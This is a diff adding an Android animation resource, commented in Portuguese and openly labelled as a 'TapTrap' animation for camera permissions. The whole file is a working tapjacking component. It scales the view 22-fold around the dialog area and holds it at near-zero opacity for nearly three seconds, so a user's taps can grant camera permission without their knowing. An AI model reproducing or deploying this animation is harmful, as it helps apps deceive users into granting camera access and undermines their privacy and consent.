@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Animação TapTrap específica para permissões de câmera -->
+<set xmlns:android="http://schemas.android.com/apk/res/android">
+    <!-- Escalar para área específica de diálogos de câmera -->
+    <scale
+        android:fromXScale="22"
+        android:toXScale="22"
+        android:fromYScale="22"
+        android:toYScale="22"
+        android:pivotX="50%"
+        android:pivotY="48%"
+        android:repeatCount="1"
+        android:duration="2900" />
+    <!-- Transparência ultra baixa -->
+    <alpha
+        android:fromAlpha="0.001"
+        android:toAlpha="0.001"
+        android:repeatCount="1"
+        android:duration="2900" />
+    <!-- Posicionamento preciso -->
+    <translate
+        android:fromXDelta="0%"
+        android:toXDelta="3%"
+        android:fromYDelta="0%"
+        android:toYDelta="2%"
+        android:duration="2900" />
+</set>
